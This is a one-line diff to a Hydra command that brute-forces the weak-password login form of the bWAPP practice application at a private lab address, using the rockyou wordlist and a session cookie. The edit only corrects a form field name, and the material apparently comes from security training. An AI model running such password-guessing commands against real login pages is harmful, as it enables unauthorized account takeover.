@@ -1,1 +1,1 @@
-hydra 192.168.56.11 -v -V -l test -P /usr/share/wordlists/rockyou.txt http-post-form "/bwapp/ba_weak_pwd.php:login=^USER^&password=^PASS^&action=login:H=Cookie\:PHPSESSID=qmsvaumo56lfs4j0tv8hvnkd53; security=low:F=Username and/or password incorrect"
+hydra 192.168.56.11 -v -V -l test -P /usr/share/wordlists/rockyou.txt http-post-form "/bwapp/ba_weak_pwd.php:username=^USER^&password=^PASS^&action=login:H=Cookie\:PHPSESSID=qmsvaumo56lfs4j0tv8hvnkd53; security=low:F=Username and/or password incorrect"
